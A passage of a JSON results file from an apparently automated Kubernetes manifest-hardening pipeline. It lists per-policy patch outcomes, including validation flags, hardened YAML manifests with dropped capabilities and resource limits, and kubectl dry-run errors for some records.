    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: matkuber-b39d\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: matkuber-b39d\n  template:\n    metadata:\n      labels:\n        app: matkuber-b39d\n    spec:\n      containers:\n      - name: matkuber-b39d\n        image: matacr.azurecr.io/matkuber:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01003",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: matkuber-b39d\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: matkuber-b39d\n  template:\n    metadata:\n      labels:\n        app: matkuber-b39d\n    spec:\n      containers:\n      - name: matkuber-b39d\n        image: matacr.azurecr.io/matkuber:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01004",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: matkuber-b39d\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: matkuber-b39d\n  template:\n    metadata:\n      labels:\n        app: matkuber-b39d\n    spec:\n      containers:\n      - name: matkuber-b39d\n        image: matacr.azurecr.io/matkuber:stable\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01005",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: matkuber-b39d\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: matkuber-b39d\n  template:\n    metadata:\n      labels:\n        app: matkuber-b39d\n    spec:\n      containers:\n      - name: matkuber-b39d\n        image: matacr.azurecr.io/matkuber:stable\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01006",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: matkuber-b39d\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: matkuber-b39d\n  template:\n    metadata:\n      labels:\n        app: matkuber-b39d\n    spec:\n      containers:\n      - name: matkuber-b39d\n        image: matacr.azurecr.io/matkuber:stable\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01007",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"dataservice-forecast-cronjob\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01008",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"dataservice-forecast-cronjob\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01009",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"dataservice-forecast-cronjob\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01010",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"dataservice-forecast-cronjob\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01011",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"dataservice-forecast-cronjob\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01012",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config-8kcgd8t8th\n        name: config-volume\n",
    "errors": []
  },
  {
    "id": "01013",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config-8kcgd8t8th\n        name: config-volume\n",
    "errors": []
  },
  {
    "id": "01014",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config-8kcgd8t8th\n        name: config-volume\n",
    "errors": []
  },
  {
    "id": "01015",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: jupyter-web-app\n    kustomize.component: jupyter-web-app\n  name: jupyter-web-app-deployment\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jupyter-web-app\n      kustomize.component: jupyter-web-app\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: jupyter-web-app\n        kustomize.component: jupyter-web-app\n    spec:\n      containers:\n      - env:\n        - name: USERID_HEADER\n          valueFrom:\n            configMapKeyRef:\n              key: userid-header\n              name: kubeflow-config\n        - name: USERID_PREFIX\n          valueFrom:\n            configMapKeyRef:\n              key: userid-prefix\n              name: kubeflow-config\n        image: gcr.io/kubeflow-images-public/jupyter-web-app:vmaster-ge4456300\n        name: jupyter-web-app\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - mountPath: /etc/config\n          name: config-volume\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccountName: jupyter-web-app-service-account\n      volumes:\n      - configMap:\n          name: jupyter-web-app-jupyter-web-app-config-8kcgd8t8th\n        name: config-volume\n",
    "errors": []
  },
  {
    "id": "01016",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: job-trigger-controller-manager\n  labels:\n    app: prow\n    component: job-trigger-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: job-trigger-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: job-trigger-controller-manager\n    spec:\n      serviceAccount: job-trigger-controller-manager\n      containers:\n      - image: job-trigger-controller-manager:stable\n        name: job-trigger-controller-manager\n        command:\n        - job-trigger-controller-manager\n        args:\n        - --dry-run=false\n        - --namespace=ci\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01017",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: job-trigger-controller-manager\n  labels:\n    app: prow\n    component: job-trigger-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: job-trigger-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: job-trigger-controller-manager\n    spec:\n      serviceAccount: job-trigger-controller-manager\n      containers:\n      - image: job-trigger-controller-manager:stable\n        name: job-trigger-controller-manager\n        command:\n        - job-trigger-controller-manager\n        args:\n        - --dry-run=false\n        - --namespace=ci\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01018",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: job-trigger-controller-manager\n  labels:\n    app: prow\n    component: job-trigger-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: job-trigger-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: job-trigger-controller-manager\n    spec:\n      serviceAccount: job-trigger-controller-manager\n      containers:\n      - image: job-trigger-controller-manager:stable\n        name: job-trigger-controller-manager\n        command:\n        - job-trigger-controller-manager\n        args:\n        - --dry-run=false\n        - --namespace=ci\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01019",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: job-trigger-controller-manager\n  labels:\n    app: prow\n    component: job-trigger-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: job-trigger-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: job-trigger-controller-manager\n    spec:\n      serviceAccount: job-trigger-controller-manager\n      containers:\n      - image: job-trigger-controller-manager:stable\n        name: job-trigger-controller-manager\n        command:\n        - job-trigger-controller-manager\n        args:\n        - --dry-run=false\n        - --namespace=ci\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01020",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: ci\n  name: job-trigger-controller-manager\n  labels:\n    app: prow\n    component: job-trigger-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow\n      component: job-trigger-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: job-trigger-controller-manager\n    spec:\n      serviceAccount: job-trigger-controller-manager\n      containers:\n      - image: job-trigger-controller-manager:stable\n        name: job-trigger-controller-manager\n        command:\n        - job-trigger-controller-manager\n        args:\n        - --dry-run=false\n        - --namespace=ci\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01021",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: ifinodin/payment:v0.0.1\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01022",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: ifinodin/payment:v0.0.1\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01023",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: ifinodin/payment:v0.0.1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01024",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: ifinodin/payment:v0.0.1\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01025",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    k8s-app: heapster\n    name: heapster\n    version: v6\n  name: heapster\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n    spec:\n      containers:\n      - name: heapster\n        image: kubernetes/heapster:canary\n        imagePullPolicy: Always\n        command:\n        - /heapster\n        - --source=kubernetes:https://10.0.0.1\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --service-cluster-ip-range=10.10.0.0/24\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01026",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    k8s-app: heapster\n    name: heapster\n    version: v6\n  name: heapster\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n    spec:\n      containers:\n      - name: heapster\n        image: kubernetes/heapster:canary\n        imagePullPolicy: Always\n        command:\n        - /heapster\n        - --source=kubernetes:https://10.0.0.1\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --service-cluster-ip-range=10.10.0.0/24\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01027",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    k8s-app: heapster\n    name: heapster\n    version: v6\n  name: heapster\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n    spec:\n      containers:\n      - name: heapster\n        image: kubernetes/heapster:canary\n        imagePullPolicy: Always\n        command:\n        - /heapster\n        - --source=kubernetes:https://10.0.0.1\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --service-cluster-ip-range=10.10.0.0/24\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01028",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    k8s-app: heapster\n    name: heapster\n    version: v6\n  name: heapster\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: heapster\n    version: v6\n  template:\n    metadata:\n      labels:\n        k8s-app: heapster\n        version: v6\n    spec:\n      containers:\n      - name: heapster\n        image: kubernetes/heapster:canary\n        imagePullPolicy: Always\n        command:\n        - /heapster\n        - --source=kubernetes:https://10.0.0.1\n        - --sink=influxdb:http://monitoring-influxdb:8086\n        - --service-cluster-ip-range=10.10.0.0/24\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01029",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.3.0\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.2.0\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - 